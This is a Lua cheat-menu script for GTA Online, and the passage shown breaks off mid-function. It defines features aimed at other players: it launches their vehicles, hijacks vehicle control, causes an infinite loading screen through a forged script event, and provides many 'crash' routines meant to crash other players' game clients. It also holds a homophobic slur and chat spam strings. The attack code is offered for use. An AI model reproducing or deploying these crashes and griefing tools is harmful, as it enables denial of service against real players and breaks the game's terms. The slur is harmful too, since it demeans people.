    menu.list_action(glitchiar, "Yeet a player's vehicle", {}, "", {{1, "launch upwards"}, {2, "launch forward"}, {3, "launch backwards"}, {4, "launch downwards"}, {5, "Catapult"}}, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("The player is not inside a vehicle. D:")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            util.toast("Unable to control the vehicle. D:")
            return
        end

        switch value do
            case "launch upwards":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "launch forward":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "launch backwards":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "launch downwards":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Catapult":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
    end)

    player_toggle_loop(glitchiar, player_id, "Bugy Movement", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        ryze.request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)


    local glitch_player_list = menu.list(glitchiar, "Glitch player", {"glitchdelay"}, "")
    local object_stuff = {
        names = {
            "Ferris Wheel",
            "UFO",
            "Cement Mixer",
            "Scaffolding",
            "Garage Door",
            "Big Bowling Ball",
            "Big Soccer Ball",
            "Big Orange Ball",
            "Stunt Ramp",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "Object", {"glitchplayer"}, "Object to glitch the player.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "Spawn delay", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "Glitch player", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Player too far away. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end

            if not players.exists(player_id) then 
                util.toast("Player does not exist. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end
            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            ryze.request_model(glitch_hash)
            ryze.request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local inf_loading = menu.list(trolling, "Infinite loading screen", {}, "")
    menu.action(inf_loading, "Teleport to MC", {}, "", function()
        local xx = NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id)
        util.trigger_script_event(1 << player_id, {-1604421397, players.user(), 1, 4, xx, xx, xx, xx, 1, 1})   
    end)

    menu.divider(trolling, "Others")

    local control_veh
    control_veh = menu.toggle_loop(trolling, "Control player's vehicle", {}, "Only works on ground vehicles.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if not players.exists(player_id) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("Player to far. :c")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("Player on a heli. :/")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("Player on a plane. :/")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("Player not inside a vehicle. :/")
            menu.set_value(control_veh, false)
        end
        util.yield()
    end)

    menu.action(trolling, "Freeze type", {""}, "", function(cl)
        local number_of_cages = 10
        local ladder_hash = util.joaat("prop_towercrane_02el2")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        ryze.request_model(ladder_hash)
        
        if TASK.IS_PED_STILL(ped) then
            util.toast("The player is standing still.")
        return end

        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.25)
            obj_pos:add(pos)
            local ladder = entities.create_object(ladder_hash, obj_pos)
            ladder_objects[#ladder_objects + 1] = ladder
            ENTITY.SET_ENTITY_VISIBLE(ladder, false)
            ENTITY.SET_ENTITY_ROTATION(ladder, 0.0, 0.0, angle, 2, 0)
            ENTITY.FREEZE_ENTITY_POSITION(ladder, true)
        end
        util.yield(2500)
        for i, object in ipairs(ladder_objects) do
            entities.delete_by_handle(object)
        end
    end)
    
    menu.action(trolling, "Pull a ramp in front of a player", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    menu.action(trolling,"Kidnap player", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)


        end
	end)

    local freeze = menu.list(malicious, "Freeze type", {}, "")

    player_toggle_loop(freeze, player_id, "Native freeze", {}, "Practically useless in most of the menus.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
    end)

    local crashes = menu.list(malicious, "Crashes", {}, "Op crashes", function(); end)

    local begcrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
	}

    menu.action(crashes, "Frame crashing", {}, "Blocked by popular menus", function()
		menu.trigger_commands("smstext" .. players.get_name(players.user()).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. players.get_name(players.user()))
	end)

    menu.divider(crashes, "(Sesion)")

    local sescrashes = menu.list(crashes, "Session crashes", {}, "")

    menu.action(sescrashes, "Crash V1", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(sescrashes, "Crash V2", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    menu.action(sescrashes, "5G", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    menu.action(sescrashes, "AIO", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
            end
            util.yield_once()
        end
    end)



    menu.divider(crashes, "(Ryze Exclusive)")

    menu.action(crashes, "Chinese crash", {}, "Chinese crash.", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local mdl = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(mdl) do
            STREAMING.REQUEST_MODEL(mdl)
            util.yield(5)
        end

        local ped = {}
        for i = 1, 10 do 
            local coord = ENTITY.GET_ENTITY_COORDS(player, true)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            ped[i] = entities.create_ped(0, mdl, coord, 0)

            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)

            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")

            ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
            util.yield(25)
        end
        util.yield(2500)
        for i = 1, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(25)
        end

    end)

    menu.action(crashes, "Task crash", {}, "Powerful crash.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local my_pos = ENTITY.GET_ENTITY_COORDS(user)
        local anim_dict = ("anim@mp_player_intupperstinker")
        ryze.anim_request(anim_dict)
        ryze.BlockSyncs(player_id, function()
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            util.yield(100)
            TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "take that", "stupid", "faggot", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
            util.yield(100)
        end)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, my_pos.x, my_pos.y, my_pos.z, false, false, false)

    end)

    menu.action(crashes, "Weed crash", {"crashv14"}, "", function(on_loop)
        local cord = players.get_position(player_id)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Finished.")
    end)

    local twotake = menu.list(crashes, "Other crashes", {}, "")

    menu.action(twotake, "Cars Crash", {"crashv13"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                ryze.request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)

    local modelc = menu.list(twotake, "Crash by Models", {}, "")


    menu.action(modelc, "Lights", {"crashv4"}, "", function()
        ryze.BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(modelc, "Motorcycle jesus", {"crashv18"}, "Skid from x-force", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(player_id)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(player_id) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)

    local pclpid = {}

    menu.action(modelc, "Clone crashing", {"crashv28"}, "Clones the player repeatedly until he crashes LMFAO", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 23 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                ryze.get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end)
    
    menu.action(modelc, "Big Chunxus Cwash'", {"crashv27"}, "Skid from x-force (Big CHUNGUS)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        local animation_tonta = ("anim@mp_player_intupperstinker")
        ryze.anim_request(animation_tonta)
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 20 do
            local ped1 = entities.create_ped(1, mdl, pos, 0)
            local ped_ = entities.create_ped(1, mdl2, pos, 0)
            local ped3 = entities.create_ped(1, mdl3, pos, 0)
            local ped3 = entities.create_ped(1, mdl4, pos, 0)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
            util.yield(100)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
